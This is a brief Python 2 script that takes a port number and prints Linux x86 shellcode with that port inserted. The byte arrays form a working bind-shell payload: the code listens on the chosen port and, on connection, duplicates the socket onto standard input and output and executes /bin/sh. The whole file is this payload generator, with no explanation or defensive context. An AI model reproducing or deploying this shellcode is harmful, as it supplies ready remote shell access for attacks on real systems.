'''
Author Javier Tejedor
Date 31/08/2014
'''
#!/usr/bin/python

import sys
import struct

input = sys.argv[1]

shellcodePart1 = [0x31,0xf6,0x6a,0x66,0x58,0x6a,0x01,0x5b,0x56,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xcd,0x80,0x89,0xc2,0x6a,0x02,0x5b,0x56,0x66,0x68]

shellcodePart2 = [0x66,0x6a,0x02,0x89,0xe1,0x6a,0x10,0x51,0x52,0x89,0xe1,0x6a,0x66,0x58,0xcd,0x80,0xb3,0x04,0x6a,0x05,0x52,0xb0,0x66,0x89,0xe1,0xcd,0x80,0xb3,0x05,0x56,0x56,0x52,0x6a,0x66,0x58,0x89,0xe1,0xcd,0x80,0x89,0xc3,0x6a,0x02,0x59,0x49,0x6a,0x3f,0x58,0xcd,0x80,0x75,0xf8,0x31,0xc0,0x50,0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0x50,0x89,0xe1,0x50,0x89,0xe2,0xb0,0x0b,0xcd,0x80]

port = int(input)
port = struct.pack("<h", port).encode('hex')

part1Port = port[2:]
part2Port = port[:2]

portArray = [part1Port, part2Port] 

printCode 	= ''.join('\\x%02x'%i for i in shellcodePart1)
printPort 	= ''.join('\\x%02s'%i for i in portArray) 
printCode2 	= ''.join('\\x%02x'%i for i in shellcodePart2)

print
print '"' + printCode + printPort + printCode2 + '"'
print





